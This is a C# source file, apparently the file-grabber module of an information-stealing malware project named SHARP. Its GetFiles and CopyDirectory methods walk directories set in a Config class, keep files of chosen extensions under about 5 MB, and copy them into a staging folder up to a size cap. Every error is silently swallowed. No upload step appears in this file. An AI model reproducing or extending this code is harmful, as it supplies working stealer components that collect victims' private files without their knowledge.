using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace SHARP
{
    public class Files
    {
      public static async Task GetFiles(string Head)
      {
        try
        {
          string str = Head + "\\Files";
          Directory.CreateDirectory(str);
          if (!Directory.Exists(str))
          {
            await Files.GetFiles(Head);
          }
          else
          {
            int sizefile = Config.sizefile;
            foreach (string source in Config.dirsToCollect)
              Files.CopyDirectory(source, str, "*.*", (long) sizefile);
          }
        }
        catch
        {
        }
      }

      private static long GetDirSize(string path, long size = 0)
      {
        try
        {
          foreach (string enumerateFile in Directory.EnumerateFiles(path))
          {
            try
            {
              size += new FileInfo(enumerateFile).Length;
            }
            catch
            {
            }
          }
          foreach (string enumerateDirectory in Directory.EnumerateDirectories(path))
          {
            try
            {
              size += Files.GetDirSize(enumerateDirectory);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
        return size;
      }

      public static void CopyDirectory(string source, string target, string pattern, long maxSize)
      {
        Stack<SHARP.GetFiles.Folders> foldersStack = new Stack<SHARP.GetFiles.Folders>();
        foldersStack.Push(new SHARP.GetFiles.Folders(source, target));
        long dirSize = Files.GetDirSize(target);
        while (foldersStack.Count > 0)
        {
          SHARP.GetFiles.Folders folders = foldersStack.Pop();
          try
          {
            Directory.CreateDirectory(folders.Target);
            foreach (string enumerateFile in Directory.EnumerateFiles(folders.Source, pattern))
            {
              try
              {
                if (Array.IndexOf<string>(Config.extensions, Path.GetExtension(enumerateFile).ToLower()) >= 0)
                {
                  string str = Path.Combine(folders.Target, Path.GetFileName(enumerateFile));
                  if (new FileInfo(enumerateFile).Length / 1024L /*0x0400*/ < 5000L)
                  {
                    File.Copy(enumerateFile, str);
                    dirSize += new FileInfo(str).Length;
                    if (dirSize > maxSize)
                      return;
                  }
                }
              }
              catch
              {
              }
            }
          }
          catch (UnauthorizedAccessException ex)
          {
            continue;
          }
          catch (PathTooLongException ex)
          {
            continue;
          }
          try
          {
            foreach (string enumerateDirectory in Directory.EnumerateDirectories(folders.Source))
            {
              try
              {
                if (!enumerateDirectory.Contains(Path.Combine(Help.DesktopPath, Environment.UserName)))
                  foldersStack.Push(new SHARP.GetFiles.Folders(enumerateDirectory, Path.Combine(folders.Target, Path.GetFileName(enumerateDirectory))));
              }
              catch
              {
              }
            }
          }
          catch (UnauthorizedAccessException ex)
          {
          }
          catch (DirectoryNotFoundException ex)
          {
          }
          catch (PathTooLongException ex)
          {
          }
        }
        foldersStack.Clear();
      }
    }
}
